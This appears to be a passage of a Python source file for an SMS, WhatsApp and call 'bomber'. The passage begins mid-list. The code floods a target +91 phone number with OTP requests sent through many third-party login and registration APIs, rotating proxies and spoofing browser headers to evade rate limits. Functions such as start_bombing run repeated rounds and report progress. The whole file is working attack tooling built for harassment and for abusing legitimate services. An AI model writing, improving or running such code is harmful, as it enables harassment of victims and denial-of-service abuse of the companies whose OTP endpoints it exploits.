    '"statuscode":0', '"statusCode":0', '"code":0',
    '"statusCode":200', '"statusCode": 200',
    '"status":1', '"status": 1',
    '"status":200', '"status": 200',
    '"httpCode":200', '"httpCode": 200',
    '"response_code":"success"', '"response_code": "success"',
    '"response_code":"SUCCESS"',
    '"response":"otp', '"response": "otp',
    '"is_new_user":', '"user_exists":',
    '"mobile_verified":', '"phone_verified":',
    '"contactExist":', '"emailExists":',
    '"user_id":', '"userId":',
    '"data":{',
    "request processed",
)


def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
    stripped = body.strip()

    # ── HTTP 202 Accepted = OTP dispatched async (Swiggy pattern) ─────────────
    if status == 202:
        return True

    if stripped in ("", "(no body)"):
        return False

    low = stripped.lower()

    # HTML response = CDN/WAF/maintenance page, never a success
    if low.startswith("<!doctype") or low.startswith("<html"):
        return False

    # Literal failure scalar values
    if low in ("false", "null", "0", "undefined", "[]", "{}"):
        return False

    # Check per-API hint (fast-path) — only skip if fail pattern overrides
    ok_hint_found = bool(ok_hint and ok_hint.lower() in low)

    # Fail patterns take priority over everything
    for pat in _FAIL_PATTERNS:
        if pat.lower() in low:
            return False

    # Per-API hint confirmed (fail patterns already cleared above)
    if ok_hint_found:
        return True

    # Generic ok patterns
    for pat in _OK_PATTERNS:
        if pat.lower() in low:
            return True

    # Final heuristic: JSON 200/201 with OTP-related keywords
    if status in (200, 201) and len(stripped) > 10:
        if (stripped.startswith("{") or stripped.startswith("[")) and any(
            h in low for h in ["otp", "sent", "verify", "phone", "mobile",
                               "token", "session", "success", "sms", "message",
                               "nonce", "user", "login"]
        ):
            return True

    return False


def _is_rate_limited(body: str, status: int) -> bool:
    if status == 429:
        return True
    low = body.lower()
    return any(p in low for p in ("rate limit", "too many request", "throttle",
                                   "slow down", "retry after"))


# ─── Placeholder substitution ─────────────────────────────────────────────────

def _substitute(value, phone: str, phone_cc: str):
    if isinstance(value, str):
        return value.replace("{phone}", phone).replace("{phone_cc}", phone_cc)
    if isinstance(value, dict):
        return {k: _substitute(v, phone, phone_cc) for k, v in value.items()}
    if isinstance(value, list):
        return [_substitute(v, phone, phone_cc) for v in value]
    return value


# ─── Single HTTP request ──────────────────────────────────────────────────────
# Order: DIRECT first, then up to MAX_PROXY_TRIES proxies as fallback.

MAX_PROXY_TRIES = 3


async def _fire_single(
    url: str, method: str, headers: dict,
    payload, name: str,
    form_encoded: bool = False,
    ok_hint: str = "",
):
    timeout = aiohttp.ClientTimeout(total=15, connect=7)
    kw_base: dict = dict(headers=headers, timeout=timeout, allow_redirects=True, ssl=False)
    if isinstance(payload, dict):
        if form_encoded:
            kw_base["data"] = payload
        else:
            kw_base["json"] = payload

    # Build attempt list: None = direct, then proxy strings
    attempts: list[Optional[str]] = [None]
    seen: set[str] = set()
    for _ in range(MAX_PROXY_TRIES):
        p = _proxy_pool.next()
        if p and p not in seen:
            seen.add(p)
            attempts.append(f"http://{p}")

    last: tuple = (False, -1, "NO_ATTEMPT")

    for proxy in attempts:
        kw = dict(kw_base)
        if proxy:
            kw["proxy"] = proxy

        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        try:
            async with aiohttp.ClientSession(connector=connector) as s:
                async with getattr(s, method)(url, **kw) as resp:
                    status = resp.status
                    try:
                        raw     = await asyncio.wait_for(resp.read(), timeout=6)
                        snippet = raw[:700].decode("utf-8", errors="replace")
                    except Exception:
                        snippet = "(no body)"

            ok = _body_ok(snippet, status, ok_hint)
            last = (ok, status, snippet)

            if ok:
                return ok, status, snippet

            if proxy:
                if status in (403, 407) or status == 0:
                    _proxy_pool.mark_bad(proxy.replace("http://", ""))
                if _is_rate_limited(snippet, status):
                    _proxy_pool.mark_bad(proxy.replace("http://", ""))
                continue   # always continue for proxy attempts

            # Direct request returned non-ok
            return ok, status, snippet

        except asyncio.TimeoutError:
            if proxy:
                _proxy_pool.mark_bad(proxy.replace("http://", ""))
                continue
            return False, 0, "TIMEOUT"
        except Exception as exc:
            if proxy:
                _proxy_pool.mark_bad(proxy.replace("http://", ""))
                continue
            return False, -1, str(exc)[:120]

    return last


# ─── Fire one API ─────────────────────────────────────────────────────────────

MAX_RETRIES = 2


async def call_api(api: dict, phone: str):
    name         = api["name"]
    kind         = api.get("kind", "sms")
    icon         = {"sms": "📱", "whatsapp": "💬", "call": "📞"}.get(kind, "📡")
    phone_cc     = f"+91{phone}"
    ok_hint      = api.get("ok_hint", "")
    form_encoded = api.get("form_encoded", False)
    payload_key  = "data" if form_encoded else "json"

    if _is_cooled(name):
        logger.info(f"⏸ [{name}] Circuit cooling — skip")
        return (name, kind, False, -2, "CIRCUIT_COOLDOWN")

    url    = _substitute(api["url"], phone, phone_cc)
    method = api["method"].lower()

    login_payload    = _substitute(api[payload_key], phone, phone_cc)
    register_key     = f"register_{payload_key}"
    register_payload = _substitute(
        api.get(register_key, api[payload_key]), phone, phone_cc
    )

    def _make_headers() -> dict:
        h = dict(api.get("base_headers", {}))
        h.setdefault("User-Agent",      _rand_ua())
        h.setdefault("Accept",          "application/json, text/plain, */*")
        h.setdefault("Accept-Language", _rand_lang())
        h["Accept-Encoding"] = "gzip, deflate, br"
        h["Connection"]      = "keep-alive"
        h["sec-fetch-dest"]  = "empty"
        h["sec-fetch-mode"]  = "cors"
        h["sec-fetch-site"]  = "same-origin"
        return _substitute(h, phone, phone_cc)

    for attempt in range(1 + MAX_RETRIES):
        results = await asyncio.gather(
            _fire_single(url, method, _make_headers(), login_payload,
                         name, form_encoded, ok_hint),
            _fire_single(url, method, _make_headers(), register_payload,
                         name, form_encoded, ok_hint),
            return_exceptions=True,
        )

        best_ok = False
        best_status = 0
        best_snippet = ""
        for r in results:
            if isinstance(r, Exception):
                continue
            ok, status, snippet = r
            if ok:
                best_ok = True
                best_status = status
                best_snippet = snippet
                break
            if status > best_status:
                best_status = status
                best_snippet = snippet

        if best_ok:
            _record_ok(name)
            logger.info(f"✅ {icon}[{name}] HTTP {best_status} | {best_snippet[:160]}")
            return (name, kind, True, best_status, best_snippet[:160])

        if _is_rate_limited(best_snippet, best_status):
            _record_fail(name)
            if attempt < MAX_RETRIES:
                await asyncio.sleep(random.uniform(1.0, 2.5))
                continue

        if best_status in {500, 502, 503, 504} and attempt < MAX_RETRIES:
            await asyncio.sleep(random.uniform(0.3, 1.0))
            continue

        logger.info(f"❌ {icon}[{name}] HTTP {best_status} | {best_snippet[:160]}")
        _record_fail(name)
        return (name, kind, False, best_status, best_snippet[:160])

    return (name, kind, False, -1, "EXHAUSTED")


# ─── Group by kind ────────────────────────────────────────────────────────────

def _group_by_kind() -> dict:
    g: dict[str, list[dict]] = {"sms": [], "whatsapp": [], "call": []}
    for api in APIS:
        g.setdefault(api["kind"], []).append(api)
    return g


# ─── Guaranteed round ─────────────────────────────────────────────────────────

async def _fire_guaranteed(phone: str, kind_groups: dict) -> list:
    tasks   = [call_api(api, phone) for api in APIS]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    kind_success = {k: False for k in kind_groups}
    for r in results:
        if isinstance(r, tuple) and r[2] is True:
            kind_success[r[1]] = True

    retry_tasks = []
    for kind, ok in kind_success.items():
        if not ok:
            for api in kind_groups.get(kind, []):
                if not _is_cooled(api["name"]):
                    retry_tasks.append(call_api(api, phone))
                    break

    extra = []
    if retry_tasks:
        extra = await asyncio.gather(*retry_tasks, return_exceptions=True)
    return list(results) + extra


# ─── Main bombing engine ──────────────────────────────────────────────────────

async def start_bombing(phone: str, rounds: int, progress_callback=None):
    success = failed = sms_ok = wa_ok = call_ok = 0
    total   = rounds * API_COUNT
    done    = 0

    await _proxy_pool.ensure_ready()
    pool_sz = _proxy_pool.size()
    logger.info(
        f"🚀 BOMB START | +91{phone} | rounds={rounds} "
        f"| APIs={API_COUNT} (📱{SMS_COUNT} 💬{WHATSAPP_COUNT} 📞{CALL_COUNT}) "
        f"| proxies={pool_sz}"
    )

    kind_groups = _group_by_kind()

    for round_num in range(1, rounds + 1):
        logger.info(f"── Round {round_num}/{rounds} (proxy pool: {_proxy_pool.size()}) ──")

        if _proxy_pool.size() < MIN_POOL_SIZE:
            asyncio.ensure_future(_proxy_pool.refresh())

        results    = await _fire_guaranteed(phone, kind_groups)
        round_ok   = 0
        round_fail = 0

        for r in results:
            if not isinstance(r, tuple):
                failed += 1; round_fail += 1; done += 1; continue
            _, kind, ok, _, _ = r
            if ok:
                success += 1; round_ok += 1
                if kind == "sms":         sms_ok  += 1
                elif kind == "whatsapp":  wa_ok   += 1
                elif kind == "call":      call_ok += 1
            else:
                failed += 1; round_fail += 1
            done += 1

        logger.info(
            f"── Round {round_num} done | ✅{round_ok} ❌{round_fail} "
            f"| Total ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) ❌{failed}"
        )

        if progress_callback:
            pct   = int((done / max(total, 1)) * 100)
            rate  = success / max(done, 1)
            speed = ("🟢 𝗙𝗔𝗦𝗧" if rate > 0.50 else
                     "🟡 𝗠𝗘𝗗𝗜𝗨𝗠" if rate > 0.25 else "🔴 𝗦𝗟𝗢𝗪")
            bar_f = min(pct // 7, 14)
            bar   = "▰" * bar_f + "▱" * (14 - bar_f)
            await progress_callback(
                round_num, rounds, success, failed,
                done, total, pct, bar, speed,
                sms_ok, wa_ok, call_ok,
            )

    rate_pct = int(success / max(done, 1) * 100)
    logger.info(
        f"🏁 BOMB END | ✅{success} (📱{sms_ok} 💬{wa_ok} 📞{call_ok}) "
        f"❌{failed} | rate={rate_pct}%"
    )
    return success, failed, sms_ok, wa_ok, call_ok
